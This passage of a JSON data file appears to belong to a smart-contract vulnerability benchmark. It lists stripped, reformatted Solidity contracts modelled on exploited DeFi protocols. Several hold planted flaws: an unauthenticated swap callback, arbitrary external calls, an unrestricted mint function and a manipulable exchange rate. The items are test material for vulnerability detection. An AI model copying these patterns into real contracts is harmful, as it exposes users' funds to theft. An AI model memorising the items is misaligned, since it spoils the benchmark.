      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface IWETH {\nfunction deposit() external payable;\nfunction withdraw(uint256 amount) external;\nfunction balanceOf(address account) external view returns (uint256);\n}\ncontract CowSolver {\nIWETH public immutable WETH;\naddress public immutable settlement;\nconstructor(address _weth, address _settlement) {\nWETH = IWETH(_weth);\nsettlement = _settlement;\n}\nfunction uniswapV3SwapCallback(\nint256 amount0Delta,\nint256 amount1Delta,\nbytes calldata data\n) external payable {\n(\nuint256 price,\naddress solver,\naddress tokenIn,\naddress recipient\n) = abi.decode(data, (uint256, address, address, address));\nuint256 amountToPay;\nif (amount0Delta > 0) {\namountToPay = uint256(amount0Delta);\n} else {\namountToPay = uint256(amount1Delta);\n}\nif (tokenIn == address(WETH)) {\nWETH.withdraw(amountToPay);\npayable(recipient).transfer(amountToPay);\n} else {\nIERC20(tokenIn).transfer(recipient, amountToPay);\n}\n}\nfunction executeSettlement(bytes calldata settlementData) external {\nrequire(msg.sender == settlement, \"Only settlement\");\n}\nreceive() external payable {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 68,
        "transformed_lines": 52,
        "original_chars": 1772,
        "transformed_chars": 1401,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_tc_040",
      "transformed_id": "ss_l1_compressed_sn_tc_040",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface IUniswapV3Router {\nstruct ExactInputSingleParams {\naddress tokenIn;\naddress tokenOut;\nuint24 fee;\naddress recipient;\nuint256 deadline;\nuint256 amountIn;\nuint256 amountOutMinimum;\nuint160 sqrtPriceLimitX96;\n}\nfunction exactInputSingle(\nExactInputSingleParams calldata params\n) external payable returns (uint256 amountOut);\n}\ncontract BedrockVault {\nIERC20 public immutable uniBTC;\nIERC20 public immutable WBTC;\nIUniswapV3Router public immutable router;\nuint256 public totalETHDeposited;\nuint256 public totalUniBTCMinted;\nconstructor(address _uniBTC, address _wbtc, address _router) {\nuniBTC = IERC20(_uniBTC);\nWBTC = IERC20(_wbtc);\nrouter = IUniswapV3Router(_router);\n}\nfunction mint() external payable {\nrequire(msg.value > 0, \"No ETH sent\");\nuint256 uniBTCAmount = msg.value;\ntotalETHDeposited += msg.value;\ntotalUniBTCMinted += uniBTCAmount;\nuniBTC.transfer(msg.sender, uniBTCAmount);\n}\nfunction redeem(uint256 amount) external {\nrequire(amount > 0, \"No amount specified\");\nrequire(uniBTC.balanceOf(msg.sender) >= amount, \"Insufficient balance\");\nuniBTC.transferFrom(msg.sender, address(this), amount);\nuint256 ethAmount = amount;\nrequire(address(this).balance >= ethAmount, \"Insufficient ETH\");\npayable(msg.sender).transfer(ethAmount);\n}\nfunction getExchangeRate() external pure returns (uint256) {\nreturn 1e18;\n}\nreceive() external payable {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 21,
        "mode": "compressed",
        "original_lines": 78,
        "transformed_lines": 57,
        "original_chars": 2069,
        "transformed_chars": 1709,
        "compression_ratio": 0.83
      },
      "error": null
    },
    {
      "original_id": "sn_tc_041",
      "transformed_id": "ss_l1_compressed_sn_tc_041",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ncontract ShezmuCollateralToken is IERC20 {\nstring public name = \"Shezmu Collateral Token\";\nstring public symbol = \"SCT\";\nuint8 public decimals = 18;\nmapping(address => uint256) public balanceOf;\nmapping(address => mapping(address => uint256)) public allowance;\nuint256 public totalSupply;\nfunction mint(address to, uint256 amount) external {\nbalanceOf[to] += amount;\ntotalSupply += amount;\n}\nfunction transfer(\naddress to,\nuint256 amount\n) external override returns (bool) {\nrequire(balanceOf[msg.sender] >= amount, \"Insufficient balance\");\nbalanceOf[msg.sender] -= amount;\nbalanceOf[to] += amount;\nreturn true;\n}\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external override returns (bool) {\nrequire(balanceOf[from] >= amount, \"Insufficient balance\");\nrequire(\nallowance[from][msg.sender] >= amount,\n\"Insufficient allowance\"\n);\nbalanceOf[from] -= amount;\nbalanceOf[to] += amount;\nallowance[from][msg.sender] -= amount;\nreturn true;\n}\nfunction approve(\naddress spender,\nuint256 amount\n) external override returns (bool) {\nallowance[msg.sender][spender] = amount;\nreturn true;\n}\n}\ncontract ShezmuVault {\nIERC20 public collateralToken;\nIERC20 public shezUSD;\nmapping(address => uint256) public collateralBalance;\nmapping(address => uint256) public debtBalance;\nuint256 public constant COLLATERAL_RATIO = 150;\nuint256 public constant BASIS_POINTS = 100;\nconstructor(address _collateralToken, address _shezUSD) {\ncollateralToken = IERC20(_collateralToken);\nshezUSD = IERC20(_shezUSD);\n}\nfunction addCollateral(uint256 amount) external {\ncollateralToken.transferFrom(msg.sender, address(this), amount);\ncollateralBalance[msg.sender] += amount;\n}\nfunction borrow(uint256 amount) external {\nuint256 maxBorrow = (collateralBalance[msg.sender] * BASIS_POINTS) /\nCOLLATERAL_RATIO;\nrequire(\ndebtBalance[msg.sender] + amount <= maxBorrow,\n\"Insufficient collateral\"\n);\ndebtBalance[msg.sender] += amount;\nshezUSD.transfer(msg.sender, amount);\n}\nfunction repay(uint256 amount) external {\nrequire(debtBalance[msg.sender] >= amount, \"Excessive repayment\");\nshezUSD.transferFrom(msg.sender, address(this), amount);\ndebtBalance[msg.sender] -= amount;\n}\nfunction withdrawCollateral(uint256 amount) external {\nrequire(\ncollateralBalance[msg.sender] >= amount,\n\"Insufficient collateral\"\n);\nuint256 remainingCollateral = collateralBalance[msg.sender] - amount;\nuint256 maxDebt = (remainingCollateral * BASIS_POINTS) /\nCOLLATERAL_RATIO;\nrequire(\ndebtBalance[msg.sender] <= maxDebt,\n\"Would be undercollateralized\"\n);\ncollateralBalance[msg.sender] -= amount;\ncollateralToken.transfer(msg.sender, amount);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 24,
        "mode": "compressed",
        "original_lines": 124,
        "transformed_lines": 100,
        "original_chars": 3642,
        "transformed_chars": 2955,
        "compression_ratio": 0.81
      },
      "error": null
    },
    {
      "original_id": "sn_tc_042",
      "transformed_id": "ss_l1_compressed_sn_tc_042",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\nenum TokenLockup {\nUnlocked,\nLocked,\nVesting\n}\nstruct Campaign {\naddress manager;\naddress token;\nuint256 amount;\nuint256 end;\nTokenLockup tokenLockup;\nbytes32 root;\n}\nstruct ClaimLockup {\naddress tokenLocker;\nuint256 start;\nuint256 cliff;\nuint256 period;\nuint256 periods;\n}\nstruct Donation {\naddress tokenLocker;\nuint256 amount;\nuint256 rate;\nuint256 start;\nuint256 cliff;\nuint256 period;\n}\ncontract HedgeyClaimCampaigns {\nmapping(bytes16 => Campaign) public campaigns;\nfunction createLockedCampaign(\nbytes16 id,\nCampaign memory campaign,\nClaimLockup memory claimLockup,\nDonation memory donation\n) external {\nrequire(campaigns[id].manager == address(0), \"Campaign exists\");\ncampaigns[id] = campaign;\nif (donation.amount > 0 && donation.tokenLocker != address(0)) {\n(bool success, ) = donation.tokenLocker.call(\nabi.encodeWithSignature(\n\"createTokenLock(address,uint256,uint256,uint256,uint256,uint256)\",\ncampaign.token,\ndonation.amount,\ndonation.start,\ndonation.cliff,\ndonation.rate,\ndonation.period\n)\n);\nrequire(success, \"Token lock failed\");\n}\n}\nfunction cancelCampaign(bytes16 campaignId) external {\nrequire(campaigns[campaignId].manager == msg.sender, \"Not manager\");\ndelete campaigns[campaignId];\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 85,
        "transformed_lines": 69,
        "original_chars": 2039,
        "transformed_chars": 1556,
        "compression_ratio": 0.76
      },
      "error": null
    },
    {
      "original_id": "sn_tc_043",
      "transformed_id": "ss_l1_compressed_sn_tc_043",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ncontract SenecaChamber {\nuint8 public constant OPERATION_CALL = 30;\nuint8 public constant OPERATION_DELEGATECALL = 31;\nmapping(address => bool) public vaultOwners;\nfunction performOperations(\nuint8[] memory actions,\nuint256[] memory values,\nbytes[] memory datas\n) external payable returns (uint256 value1, uint256 value2) {\nrequire(\nactions.length == values.length && values.length == datas.length,\n\"Length mismatch\"\n);\nfor (uint256 i = 0; i < actions.length; i++) {\nif (actions[i] == OPERATION_CALL) {\n(address target, bytes memory callData, , , ) = abi.decode(\ndatas[i],\n(address, bytes, uint256, uint256, uint256)\n);\n(bool success, ) = target.call{value: values[i]}(callData);\nrequire(success, \"Call failed\");\n}\n}\nreturn (0, 0);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 12,
        "mode": "compressed",
        "original_lines": 49,
        "transformed_lines": 37,
        "original_chars": 1413,
        "transformed_chars": 1086,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_tc_044",
      "transformed_id": "ss_l1_compressed_sn_tc_044",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface ISmartLoan {\nfunction swapDebtParaSwap(\nbytes32 _fromAsset,\nbytes32 _toAsset,\nuint256 _repayAmount,\nuint256 _borrowAmount,\nbytes4 selector,\nbytes memory data\n) external;\nfunction claimReward(address pair, uint256[] calldata ids) external;\n}\ncontract SmartLoansFactory {\naddress public admin;\nconstructor() {\nadmin = msg.sender;\n}\nfunction createLoan() external returns (address) {\nSmartLoan loan = new SmartLoan();\nreturn address(loan);\n}\nfunction upgradePool(\naddress poolProxy,\naddress newImplementation\n) external {\nrequire(msg.sender == admin, \"Not admin\");\n}\n}\ncontract SmartLoan is ISmartLoan {\nmapping(bytes32 => uint256) public deposits;\nmapping(bytes32 => uint256) public debts;\nfunction swapDebtParaSwap(\nbytes32 _fromAsset,\nbytes32 _toAsset,\nuint256 _repayAmount,\nuint256 _borrowAmount,\nbytes4 selector,\nbytes memory data\n) external override {}\nfunction claimReward(\naddress pair,\nuint256[] calldata ids\n) external override {\n(bool success, ) = pair.call(\nabi.encodeWithSignature(\"claimRewards(address)\", msg.sender)\n);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 15,
        "mode": "compressed",
        "original_lines": 73,
        "transformed_lines": 58,
        "original_chars": 1745,
        "transformed_chars": 1395,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_tc_045",
      "transformed_id": "ss_l1_compressed_sn_tc_045",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ninterface IPendleMarket {\nfunction getRewardTokens() external view returns (address[] memory);\nfunction rewardIndexesCurrent() external returns (uint256[] memory);\nfunction claimRewards(address user) external returns (uint256[] memory);\n}\ncontract PenpieStaking {\nmapping(address => mapping(address => uint256)) public userBalances;\nmapping(address => uint256) public totalStaked;\nfunction deposit(address market, uint256 amount) external {\nIERC20(market).transferFrom(msg.sender, address(this), amount);\nuserBalances[market][msg.sender] += amount;\ntotalStaked[market] += amount;\n}\nfunction claimRewards(address market, address user) external {\nuint256[] memory rewards = IPendleMarket(market).claimRewards(user);\nfor (uint256 i = 0; i < rewards.length; i++) {}\n}\nfunction withdraw(address market, uint256 amount) external {\nrequire(\nuserBalances[market][msg.sender] >= amount,\n\"Insufficient balance\"\n);\nuserBalances[market][msg.sender] -= amount;\ntotalStaked[market] -= amount;\nIERC20(market).transfer(msg.sender, amount);\n}\n}\ncontract PendleMarketRegister {\nmapping(address => bool) public registeredMarkets;\nfunction registerMarket(address market) external {\nregisteredMarkets[market] = true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 18,
        "mode": "compressed",
        "original_lines": 62,
        "transformed_lines": 44,
        "original_chars": 1811,
        "transformed_chars": 1550,
        "compression_ratio": 0.86
      },
      "error": null
    },
    {
      "original_id": "sn_tc_046",
      "transformed_id": "ss_l1_compressed_sn_tc_046",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ncontract FloatHotWalletV2 {\naddress public owner;\nmapping(address => bool) public authorizedOperators;\nevent Withdrawal(address token, address to, uint256 amount);\nconstructor() {\nowner = msg.sender;\n}\nmodifier onlyOwner() {\nrequire(msg.sender == owner, \"Not owner\");\n_;\n}\nfunction withdraw(\naddress token,\naddress to,\nuint256 amount\n) external onlyOwner {\nif (token == address(0)) {\npayable(to).transfer(amount);\n} else {\nIERC20(token).transfer(to, amount);\n}\nemit Withdrawal(token, to, amount);\n}\nfunction emergencyWithdraw(address token) external onlyOwner {\nuint256 balance;\nif (token == address(0)) {\nbalance = address(this).balance;\npayable(owner).transfer(balance);\n} else {\nbalance = IERC20(token).balanceOf(address(this));\nIERC20(token).transfer(owner, balance);\n}\nemit Withdrawal(token, owner, balance);\n}\nfunction transferOwnership(address newOwner) external onlyOwner {\nowner = newOwner;\n}\nreceive() external payable {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 15,
        "mode": "compressed",
        "original_lines": 59,
        "transformed_lines": 44,
        "original_chars": 1432,
        "transformed_chars": 1118,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_tc_047",
      "transformed_id": "ss_l1_compressed_sn_tc_047",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ncontract PlayDappToken {\nstring public name = \"PlayDapp Token\";\nstring public symbol = \"PLA\";\nuint8 public decimals = 18;\nuint256 public totalSupply;\naddress public minter;\nmapping(address => uint256) public balanceOf;\nmapping(address => mapping(address => uint256)) public allowance;\nevent Transfer(address indexed from, address indexed to, uint256 value);\nevent Approval(\naddress indexed owner,\naddress indexed spender,\nuint256 value\n);\nevent Minted(address indexed to, uint256 amount);\nconstructor() {\nminter = msg.sender;\n_mint(msg.sender, 700_000_000 * 10 ** 18);\n}\nmodifier onlyMinter() {\nrequire(msg.sender == minter, \"Not minter\");\n_;\n}\nfunction mint(address to, uint256 amount) external onlyMinter {\n_mint(to, amount);\nemit Minted(to, amount);\n}\nfunction _mint(address to, uint256 amount) internal {\nrequire(to != address(0), \"Mint to zero address\");\ntotalSupply += amount;\nbalanceOf[to] += amount;\nemit Transfer(address(0), to, amount);\n}\nfunction setMinter(address newMinter) external onlyMinter {\nminter = newMinter;\n}\nfunction transfer(address to, uint256 amount) external returns (bool) {\nrequire(balanceOf[msg.sender] >= amount, \"Insufficient balance\");\nbalanceOf[msg.sender] -= amount;\nbalanceOf[to] += amount;\nemit Transfer(msg.sender, to, amount);\nreturn true;\n}\nfunction approve(address spender, uint256 amount) external returns (bool) {\nallowance[msg.sender][spender] = amount;\nemit Approval(msg.sender, spender, amount);\nreturn true;\n}\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool) {\nrequire(balanceOf[from] >= amount, \"Insufficient balance\");\nrequire(\nallowance[from][msg.sender] >= amount,\n\"Insufficient allowance\"\n);\nbalanceOf[from] -= amount;\nbalanceOf[to] += amount;\nallowance[from][msg.sender] -= amount;\nemit Transfer(from, to, amount);\nreturn true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 21,
        "mode": "compressed",
        "original_lines": 91,
        "transformed_lines": 70,
        "original_chars": 2470,
        "transformed_chars": 2010,
        "compression_ratio": 0.81
      },
      "error": null
    },
    {
      "original_id": "sn_tc_048",
      "transformed_id": "ss_l1_compressed_sn_tc_048",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ncontract SonneMarket {\nIERC20 public underlying;\nstring public name = \"Sonne WETH\";\nstring public symbol = \"soWETH\";\nuint8 public decimals = 8;\nuint256 public totalSupply;\nmapping(address => uint256) public balanceOf;\nuint256 public totalBorrows;\nuint256 public totalReserves;\nevent Mint(address minter, uint256 mintAmount, uint256 mintTokens);\nevent Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);\nconstructor(address _underlying) {\nunderlying = IERC20(_underlying);\n}\nfunction exchangeRate() public view returns (uint256) {\nif (totalSupply == 0) {\nreturn 1e18;\n}\nuint256 cash = underlying.balanceOf(address(this));\nuint256 totalUnderlying = cash + totalBorrows - totalReserves;\nreturn (totalUnderlying * 1e18) / totalSupply;\n}\nfunction mint(uint256 mintAmount) external returns (uint256) {\nrequire(mintAmount > 0, \"Zero mint\");\nuint256 exchangeRateMantissa = exchangeRate();\nuint256 mintTokens = (mintAmount * 1e18) / exchangeRateMantissa;\ntotalSupply += mintTokens;\nbalanceOf[msg.sender] += mintTokens;\nunderlying.transferFrom(msg.sender, address(this), mintAmount);\nemit Mint(msg.sender, mintAmount, mintTokens);\nreturn mintTokens;\n}\nfunction redeem(uint256 redeemTokens) external returns (uint256) {\nrequire(balanceOf[msg.sender] >= redeemTokens, \"Insufficient balance\");\nuint256 exchangeRateMantissa = exchangeRate();\nuint256 redeemAmount = (redeemTokens * exchangeRateMantissa) / 1e18;\nbalanceOf[msg.sender] -= redeemTokens;\ntotalSupply -= redeemTokens;\nunderlying.transfer(msg.sender, redeemAmount);\nemit Redeem(msg.sender, redeemAmount, redeemTokens);\nreturn redeemAmount;\n}\nfunction balanceOfUnderlying(\naddress account\n) external view returns (uint256) {\nuint256 exchangeRateMantissa = exchangeRate();\nreturn (balanceOf[account] * exchangeRateMantissa) / 1e18;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 29,
        "mode": "compressed",
        "original_lines": 88,
        "transformed_lines": 59,
        "original_chars": 2469,
        "transformed_chars": 2073,
        "compression_ratio": 0.84
      },
      "error": null
    },
    {
      "original_id": "sn_tc_049",
      "transformed_id": "ss_l1_compressed_sn_tc_049",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ninterface IMarket {\nfunction getAccountSnapshot(\naddress account\n)\nexternal\nview\nreturns (uint256 collateral, uint256 borrows, uint256 exchangeRate);\n}\ncontract DebtPreviewer {\nfunction previewDebt(\naddress market,\naddress account\n)\nexternal\nview\nreturns (\nuint256 collateralValue,\nuint256 debtValue,\nuint256 healthFactor\n) {\n(uint256 collateral, uint256 borrows, uint256 exchangeRate) = IMarket(\nmarket\n).getAccountSnapshot(account);\ncollateralValue = (collateral * exchangeRate) / 1e18;\ndebtValue = borrows;\nif (debtValue == 0) {\nhealthFactor = type(uint256).max;\n} else {\nhealthFactor = (collateralValue * 1e18) / debtValue;\n}\nreturn (collateralValue, debtValue, healthFactor);\n}\nfunction previewMultipleMarkets(\naddress[] calldata markets,\naddress account\n)\nexternal\nview\nreturns (\nuint256 totalCollateral,\nuint256 totalDebt,\nuint256 overallHealth\n) {\nfor (uint256 i = 0; i < markets.length; i++) {\n(uint256 collateral, uint256 debt, ) = this.previewDebt(\nmarkets[i],\naccount\n);\ntotalCollateral += collateral;\ntotalDebt += debt;\n}\nif (totalDebt == 0) {\noverallHealth = type(uint256).max;\n} else {\noverallHealth = (totalCollateral * 1e18) / totalDebt;\n}\nreturn (totalCollateral, totalDebt, overallHealth);\n}\n}\ncontract ExactlyMarket {\nIERC20 public asset;\nDebtPreviewer public previewer;\nmapping(address => uint256) public deposits;\nmapping(address => uint256) public borrows;\nuint256 public constant COLLATERAL_FACTOR = 80;\nconstructor(address _asset, address _previewer) {\nasset = IERC20(_asset);\npreviewer = DebtPreviewer(_previewer);\n}\nfunction deposit(uint256 amount) external {\nasset.transferFrom(msg.sender, address(this), amount);\ndeposits[msg.sender] += amount;\n}\nfunction borrow(uint256 amount, address[] calldata markets) external {\n(uint256 totalCollateral, uint256 totalDebt, ) = previewer\n.previewMultipleMarkets(markets, msg.sender);\nuint256 newDebt = totalDebt + amount;\nuint256 maxBorrow = (totalCollateral * COLLATERAL_FACTOR) / 100;\nrequire(newDebt <= maxBorrow, \"Insufficient collateral\");\nborrows[msg.sender] += amount;\nasset.transfer(msg.sender, amount);\n}\nfunction getAccountSnapshot(\naddress account\n)\nexternal\nview\nreturns (uint256 collateral, uint256 borrowed, uint256 exchangeRate) {\nreturn (deposits[account], borrows[account], 1e18);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 24,
        "mode": "compressed",
        "original_lines": 128,
        "transformed_lines": 101,
        "original_chars": 3324,
        "transformed_chars": 2545,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_tc_050",
      "transformed_id": "ss_l1_compressed_sn_tc_050",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ncontract MunchablesLockManager {\naddress public admin;\naddress public configStorage;\nstruct PlayerSettings {\nuint256 lockedAmount;\naddress lockRecipient;\nuint256 lockDuration;\nuint256 lockStartTime;\n}\nmapping(address => PlayerSettings) public playerSettings;\nmapping(address => uint256) public playerBalances;\nIERC20 public immutable weth;\nevent Locked(address player, uint256 amount, address recipient);\nevent ConfigUpdated(address oldConfig, address newConfig);\nconstructor(address _weth) {\nadmin = msg.sender;\nweth = IERC20(_weth);\n}\nmodifier onlyAdmin() {\nrequire(msg.sender == admin, \"Not admin\");\n_;\n}\nfunction lock(uint256 amount, uint256 duration) external {\nrequire(amount > 0, \"Zero amount\");\nweth.transferFrom(msg.sender, address(this), amount);\nplayerBalances[msg.sender] += amount;\nplayerSettings[msg.sender] = PlayerSettings({\nlockedAmount: amount,\nlockRecipient: msg.sender,\nlockDuration: duration,\nlockStartTime: block.timestamp\n});\nemit Locked(msg.sender, amount, msg.sender);\n}\nfunction setConfigStorage(address _configStorage) external onlyAdmin {\naddress oldConfig = configStorage;\nconfigStorage = _configStorage;\nemit ConfigUpdated(oldConfig, _configStorage);\n}\nfunction setLockRecipient(\naddress player,\naddress newRecipient\n) external onlyAdmin {\nplayerSettings[player].lockRecipient = newRecipient;\n}\nfunction unlock() external {\nPlayerSettings memory settings = playerSettings[msg.sender];\nrequire(settings.lockedAmount > 0, \"No locked tokens\");\nrequire(\nblock.timestamp >= settings.lockStartTime + settings.lockDuration,\n\"Still locked\"\n);\nuint256 amount = settings.lockedAmount;\naddress recipient = settings.lockRecipient;\ndelete playerSettings[msg.sender];\nplayerBalances[msg.sender] = 0;\nweth.transfer(recipient, amount);\n}\nfunction emergencyUnlock(address player) external onlyAdmin {\nPlayerSettings memory settings = playerSettings[player];\nuint256 amount = settings.lockedAmount;\naddress recipient = settings.lockRecipient;\ndelete playerSettings[player];\nplayerBalances[player] = 0;\nweth.transfer(recipient, amount);\n}\nfunction transferAdmin(address newAdmin) external onlyAdmin {\nadmin = newAdmin;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 29,
        "mode": "compressed",
        "original_lines": 109,
        "transformed_lines": 80,
        "original_chars": 2973,
        "transformed_chars": 2409,
        "compression_ratio": 0.81
      },
      "error": null
    }
  ]
}